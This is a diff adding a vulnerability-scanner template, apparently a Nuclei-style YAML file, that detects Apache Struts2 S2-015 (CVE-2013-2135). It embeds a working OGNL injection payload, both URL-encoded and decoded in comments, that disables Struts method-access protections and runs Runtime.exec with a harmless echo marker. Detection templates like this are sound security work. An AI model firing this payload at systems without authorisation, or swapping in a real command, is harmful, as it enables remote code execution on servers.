@@ -1,0 +1,44 @@
+id: local-struts2-s2-015-cmd-rce
+
+info:
+  name: Struts2 S2-015 Command Execution via Wildcard Action OGNL (CVE-2013-2135)
+  author: pentest-platform
+  severity: critical
+  description: |
+    Apache Struts 2 S2-015 RCE via OGNL injection in wildcard action name.
+    The URL action name segment is evaluated as OGNL due to double evaluation in
+    TextParseUtil.translateVariables. Payload uses IOUtils.toString(Runtime.exec())
+    to run a command; output appears in the 404 response body because Struts2 uses
+    the OGNL result as a JSP filename (which doesn't exist).
+    Status 404 is expected; the marker text appears WITHOUT the preceding 'echo' command.
+  reference:
+    - https://cwiki.apache.org/confluence/display/WW/S2-015
+    - https://nvd.nist.gov/vuln/detail/CVE-2013-2135
+  tags: safe-poc,exploit,struts2,s2-015,cve,cve2013,rce,ognl
+
+http:
+  - method: GET
+    path:
+      # Decoded action name (single-quote exec to avoid array syntax / %20 issues):
+      # ${#context['xwork.MethodAccessor.denyMethodExecution']=false,
+      #   #m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),
+      #   #m.setAccessible(true),#m.set(#_memberAccess,true),
+      #   #q=@org.apache.commons.io.IOUtils@toString(
+      #       @java.lang.Runtime@getRuntime().exec('echo pentest-platform-s2015-rce')
+      #       .getInputStream()),#q}
+      # On success, output 'pentest-platform-s2015-rce' appears WITHOUT 'echo' prefix.
+      - "{{BaseURL}}/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27echo%20pentest-platform-s2015-rce%27%29.getInputStream%28%29%29%2C%23q%7D.action"
+      - "{{BaseURL}}/S2-015/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27echo%20pentest-platform-s2015-rce%27%29.getInputStream%28%29%29%2C%23q%7D.action"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      # The RCE output 'pentest-platform-s2015-rce' must appear WITHOUT the 'echo' command prefix.
+      # Servers that reflect the URL path in error messages would include 'echo pentest-platform-s2015-rce',
+      # which we exclude to prevent false positives on non-Struts2 servers (e.g., Hadoop YARN, Jetty).
+      - type: dsl
+        dsl:
+          - "contains(body, 'pentest-platform-s2015-rce')"
+          - "!contains(body, 'echo pentest-platform-s2015-rce')"
+      - type: status
+        status:
+          - 404
